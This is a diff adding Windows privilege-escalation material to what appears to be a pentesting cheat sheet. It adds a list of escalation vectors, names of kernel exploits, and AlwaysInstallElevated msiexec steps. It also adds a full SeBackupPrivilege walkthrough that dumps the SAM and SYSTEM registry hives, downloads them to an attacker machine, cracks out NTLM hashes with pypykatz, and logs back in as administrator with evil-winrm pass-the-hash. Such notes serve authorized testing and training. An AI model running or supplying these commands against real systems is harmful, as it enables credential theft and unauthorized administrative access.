@@ -616,6 +616,21 @@ PS C:\> Find-AllVulns
 - https://github.com/SecWiki/windows-kernel-exploits
 - https://github.com/abatchy17/WindowsExploits
 
+## Windows PE vectors
+1. The version of the operating system
+2. Any Vulnerable package installed or running
+3. Files and Folders with Full Control or Modify Access
+4. Mapped Drives
+5. Potentially Interesting Files
+6. Unquoted Service Paths
+7. Network Information (interfaces, arp, netstat)
+8. Firewall Status and Rules
+9. Running Processes
+10. AlwaysInstallElevated Registry Key Check
+11. Stored Credentials
+12. DLL Hijacking
+13. Scheduled Tasks
+
 ## Windows PE methods
 1. Windows Kernel Exploit
 
@@ -633,7 +648,7 @@ msiexec /quiet /qn /i 1.msi
 ```
 
 ```backdoor or 1.msi
-
+to be inserted
 ```
 
 2. AlwaysInstallElevated (method 2 - Adding user in Administrators Group)
@@ -647,6 +662,41 @@ upload /root/Desktop/2.msi .
 shell
 msiexec /quiet /qn /i 2.msi
 net user [username]
+```
+
+3. Windows Kernel Exploit
+- Detection: ./windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo sysinfo.txt
+- Windows ClientCopyImage Win32k Exploit
+- Windows TrackPopupMenu Win32k NULL Pointer Dereference
+- Windows SYSTEM Escalation via KiTrap0D
+- Windows Escalate Task Scheduler XML Privilege Escalation
+- MS16-016 mrxdav.sys WebDav Local Privilege Escalation
+- EPATHOBJ::pprFlattenRec Local Privilege Escalation
+- MS13-053: NTUserMessageCall Win32k Kernel Pool Overflow
+- MS16-032 Secondary Logon Handle Privilege Escalation
+- RottenPotato
+- ...
+
+4. SeBackupPrivilege - can be used on host and Domain Controller(not covered)
+- Detection: 'evil-winrm -i 192.168.1.41 -u aarti –p "123"' -> 'whoami /priv' -> look for SeBackupPrivilege (enabled)
+- Exploitation:
+```bash
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+
+#download Temp folder with sam and system from victim to kali
+cd Temp
+download sam
+download system
+
+#use pypykatz (mimikatz) on kali to extract Admin's NTLM hashes
+pypykatz registry --sam sam system
+
+#use the extracted NTLM hash to access back to victim
+evil-winrm -i 192.168.1.41 -u administrator -H "##Hash##"
+net user admin
 ```
 
 # Linux Priv Esc
